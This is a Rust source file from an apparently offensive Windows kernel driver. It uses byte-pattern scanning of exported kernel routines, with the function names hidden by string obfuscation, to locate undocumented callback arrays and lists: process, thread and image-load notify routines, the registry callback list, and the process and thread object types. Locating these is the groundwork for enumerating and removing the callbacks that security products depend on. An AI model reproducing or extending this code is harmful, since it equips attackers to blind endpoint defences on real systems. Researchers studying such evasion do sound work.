use shared::vars::Callbacks;
use crate::{includes::structs::FULL_OBJECT_TYPE, utils};
use wdk_sys::{ntddk::MmGetSystemRoutineAddress, PsProcessType, PsThreadType};
use obfstr::obfstr;
use core::ptr::null_mut;

/// Finds the address of the `PsSetCreateProcessNotifyRoutine` routine.
/// 
/// # Returns
/// - `Option<*mut u8>`: Some pointer to the address if found, None otherwise.
/// 
unsafe fn find_ps_create_process() -> Option<*mut u8> {
    let mut name = utils::uni::str_to_unicode(obfstr!("PsSetCreateProcessNotifyRoutine")).to_unicode();
    let function_address = MmGetSystemRoutineAddress(&mut name);

    let function_bytes = core::slice::from_raw_parts(function_address as *const u8, 0x14);    
    
    // e8b6010000  call  nt!PspSetCreateProcessNotifyRoutine (fffff802`517a64a8)
    let instructions = [0xE8];

    if let Some(y) = function_bytes.windows(instructions.len()).position(|x| x == instructions) {
        let position = y + 1;
        let offset = function_bytes[position..position + 4]
            .try_into()
            .map(i32::from_le_bytes)
            .expect("Slice length is not 4, cannot convert");

        // e8b6010000  call  nt!PspSetCreateProcessNotifyRoutine (fffff802`517a64a8)
        let call_address = function_address.cast::<u8>().offset(y as isize);
        // 4883c428  add  rsp,28h
        let next_address = call_address.cast::<u8>().offset(5);
        let psp_set_create_process = next_address.offset(offset as isize);

        let function_bytes = core::slice::from_raw_parts(psp_set_create_process, 0x98);
        
        // 4c8d2d4f605500  lea  r13,[nt!PspCreateProcessNotifyRoutine (fffff802`51cfc560)]
        let instructions = [0x4C, 0x8D, 0x2D];

        if let Some(x) = function_bytes.windows(instructions.len()).position(|y| y == instructions) {
            let position = x + 3;
            let offset = function_bytes[position..position + 4]
                .try_into()
                .map(i32::from_le_bytes)
                .expect("Slice length is not 4, cannot convert");

            // 4c8d2d4f605500  lea  r13,[nt!PspCreateProcessNotifyRoutine (fffff802`51cfc560)]
            let lea_address = psp_set_create_process.cast::<u8>().offset(x as isize);
            // 488d0cdd00000000  lea  rcx,[rbx*8]
            let next_address = lea_address.offset(7);
            let psp_set_create_process = next_address.offset(offset as isize);

            return Some(psp_set_create_process)
        }
    }

    None
}

/// Finds the address of the `PsRemoveCreateThreadNotifyRoutine` routine.
/// 
/// # Returns
/// - `Option<*mut u8>`: Some pointer to the address if found, None otherwise.
/// 
unsafe fn find_ps_create_thread() -> Option<*mut u8> {
    let mut name = utils::uni::str_to_unicode(obfstr!("PsRemoveCreateThreadNotifyRoutine")).to_unicode();
    let function_address = MmGetSystemRoutineAddress(&mut name);

    let function_bytes = core::slice::from_raw_parts(function_address as *const u8, 0x50);    
    
    // 488d0d57d73d00  lea  rcx,[nt!PspCreateThreadNotifyRoutine (fffff805`7b4ee160)]
    let instructions = [0x48, 0x8D, 0x0D];

    if let Some(x) = function_bytes.windows(instructions.len()).position(|x| x == instructions) {
        let position = x + 3;
        let offset = function_bytes[position..position + 4]
            .try_into()
            .map(i32::from_le_bytes)
            .expect("Slice length is not 4, cannot convert");

        // 488d0d57d73d00  lea  rcx,[nt!PspCreateThreadNotifyRoutine (fffff805`7b4ee160)]
        let lea_address = function_address.cast::<u8>().offset(x as isize);
        // 488d2cf9  lea  rbp,[rcx+rdi*8]
        let next_address = lea_address.offset(7);
        let psp_set_create_thread = next_address.offset(offset as isize);
    
        return Some(psp_set_create_thread);
    }

    None
}

/// Finds the address of the `PsSetLoadImageNotifyRoutineEx` routine.
/// 
/// # Returns
/// - `Option<*mut u8>`: Some pointer to the address if found, None otherwise.
/// 
unsafe fn find_ps_load_image() -> Option<*mut u8> {
    let mut name = utils::uni::str_to_unicode(obfstr!("PsSetLoadImageNotifyRoutineEx")).to_unicode();
    let function_address = MmGetSystemRoutineAddress(&mut name);

    let function_bytes = core::slice::from_raw_parts(function_address as *const u8, 0x50);    
    
    // 488d0d67d83d00  lea  rcx,[nt!PspLoadImageNotifyRoutine (fffff806`0f0fe360)]
    let instructions = [0x48, 0x8D, 0x0D];

    if let Some(x) = function_bytes.windows(instructions.len()).position(|x| x == instructions) {
        let position = x + 3;
        let offset = function_bytes[position..position + 4]
            .try_into()
            .map(i32::from_le_bytes)
            .expect("Slice length is not 4, cannot convert");
        
        // 488d0d67d83d00  lea  rcx,[nt!PspLoadImageNotifyRoutine (fffff806`0f0fe360)]
        let lea_address = function_address.cast::<u8>().offset(x as isize);
        // 488d2cf9  lea  rbp,[rcx+rdi*8]
        let next_address = lea_address.offset(7);
        let psp_load_image = next_address.offset(offset as isize);
        
        return Some(psp_load_image);
    }

    None
}

/// Finds the address of the `CmRegisterCallbackEx` routine.
/// 
/// # Returns
/// - `Option<*mut u8>`: Some pointer to the address if found, None otherwise.
/// 
unsafe fn find_cm_register_callback() -> Option<(*mut u8, *mut u8, *mut u8)>{
    let mut name = utils::uni::str_to_unicode(obfstr!("CmRegisterCallbackEx")).to_unicode();
    let function_address = MmGetSystemRoutineAddress(&mut name);
    let mut callback_list_header = null_mut();
    let mut callback_count = null_mut();
    let mut callback_list_lock = null_mut();

    let function_bytes = core::slice::from_raw_parts(function_address as *const u8, 0x50);

    // e8c961e7ff call nt!CmpRegisterCallbackInternal (fffff800`286e2b08)
    let register_internal_pattern = [0xE8];

    if let Some(x) = function_bytes.windows(register_internal_pattern.len()).position(|y| y == register_internal_pattern) {
        let position = x + 1;
        let offset = function_bytes[position..position + 4]
            .try_into()
            .map(i32::from_le_bytes)
            .expect("Slice length is not 4, cannot convert");
        
        // e8c961e7ff call nt!CmpRegisterCallbackInternal (fffff803`210e2b08)
        let call_address = function_address.cast::<u8>().offset(x as isize);
        // 4883c438 add rsp,38h
        let next_address = call_address.offset(5);
        let register_callback_internal = next_address.offset(offset as isize);

        let function_bytes = core::slice::from_raw_parts(register_callback_internal, 0x108);

        // 488bcb     mov rcx,rbx
        // e83d000000 call nt!CmpInsertCallbackInListByAltitude (fffff800`286e2c0c)
        let insert_pattern = [0x8B, 0xCB, 0xE8];

        if let Some(x) = function_bytes.windows(insert_pattern.len()).position(|y| y == insert_pattern) {
            let position = x + 3;
            let offset = function_bytes[position..position + 4]
                .try_into()
                .map(i32::from_le_bytes)
                .expect("Slice length is not 4, cannot convert");

            // e83d000000 call nt!CmpInsertCallbackInListByAltitude (fffff800`286e2c0c)
            let call_insert_address = register_callback_internal.cast::<u8>().offset((x + 2) as isize);
            // 488b4c2458  mov rcx,qword ptr [rsp+58h]
            let next_address = call_insert_address.offset(5);
            let insert_call_address = next_address.offset(offset as isize);

            let function_bytes = core::slice::from_raw_parts(insert_call_address, 0x200);

            // 488d0d7b585600  lea rcx,[nt!CmpCallbackListLock (fffff803`216484c0)]
            let cmp_callback_list_lock_pattern = [0x48, 0x8D, 0x0D];
            // 4c8d3d78585600  lea r15,[nt!CallbackListHead (fffff803`216484d0)]
            let callback_list_head_pattern = [0x4C, 0x8D, 0x3D];
            // f0ff05fddd5600  lock inc dword ptr [nt!CmpCallBackCount (fffff803`21650abc)]
            let cmp_callback_count_pattern = [0xF0, 0xFF, 0x05];

            if let Some(x) = function_bytes.windows(cmp_callback_list_lock_pattern.len()).position(|y| y == cmp_callback_list_lock_pattern) {
                let position = x + 3;
                let offset = function_bytes[position..position + 4]
                    .try_into()
                    .map(i32::from_le_bytes)
                    .expect("Slice length is not 4, cannot convert");

                let lea_address = insert_call_address.cast::<u8>().offset(x as isize);
                let next_address = lea_address.offset(7);
                callback_list_lock = next_address.offset(offset as isize);
            };

            if let Some(x) = function_bytes.windows(callback_list_head_pattern.len()).position(|y| y == callback_list_head_pattern) {
                let position = x + 3;
                let offset = function_bytes[position..position + 4]
                    .try_into()
                    .map(i32::from_le_bytes)
                    .expect("Slice length is not 4, cannot convert");

                let lea_address = insert_call_address.cast::<u8>().offset(x as isize);
                let next_address = lea_address.offset(7);
                callback_list_header = next_address.offset(offset as isize);
            };

            if let Some(x) = function_bytes.windows(cmp_callback_count_pattern.len()).position(|y| y == cmp_callback_count_pattern) {
                let position = x + 3;
                let offset = function_bytes[position..position + 4]
                    .try_into()
                    .map(i32::from_le_bytes)
                    .expect("Slice length is not 4, cannot convert");

                let lea_address = insert_call_address.cast::<u8>().offset(x as isize);
                let next_address = lea_address.offset(7);
                callback_count = next_address.offset(offset as isize);
            };
        }

        if !callback_list_header.is_null() && !callback_count.is_null() && !callback_list_lock.is_null() {
            return Some((callback_list_header, callback_count, callback_list_lock));
        }
    }

    None
}

/// Finds the address of the `ObRegisterCallbacks` routine.
/// 
/// # Returns
/// - `Option<*mut FULL_OBJECT_TYPE>`: Some pointer to the address if found, None otherwise.
/// 
pub fn find_ob_register_callback(callback: &Callbacks) -> Option<*mut FULL_OBJECT_TYPE> {
    match callback {
        Callbacks::ObProcess => {
            let object_type = unsafe { (*PsProcessType) as *mut FULL_OBJECT_TYPE };
            Some(object_type)
        },
        Callbacks::ObThread => {
            let object_type = unsafe { (*PsThreadType) as *mut FULL_OBJECT_TYPE };
            Some(object_type)
        },
        _ => return None
    }
}

/// Finds the type of the callback and calls the function responsible for it.
/// 
/// # Parameters
/// - `callback`: target callback that will be called.
/// 
/// # Returns
/// - `Option<*mut u8>`: Some pointer to the address if found, None otherwise.
///
pub unsafe fn find_callback_address(callback: &Callbacks) -> Option<CallbackResult> {
    match callback {
        Callbacks::PsSetCreateProcessNotifyRoutine => find_ps_create_process().map(CallbackResult::PsCreate),
        Callbacks::PsSetCreateThreadNotifyRoutine => find_ps_create_thread().map(CallbackResult::PsCreate),
        Callbacks::PsSetLoadImageNotifyRoutine => find_ps_load_image().map(CallbackResult::PsCreate),
        Callbacks::CmRegisterCallbackEx => find_cm_register_callback().map(CallbackResult::Registry),
        Callbacks::ObProcess => find_ob_register_callback(callback).map(CallbackResult::ObRegister),
        Callbacks::ObThread => find_ob_register_callback(callback).map(CallbackResult::ObRegister),
    }
}

/// Enum containing return types for each callback.
pub enum CallbackResult {
    PsCreate(*mut u8),
    Registry((*mut u8, *mut u8, *mut u8)),
    ObRegister(*mut FULL_OBJECT_TYPE)
}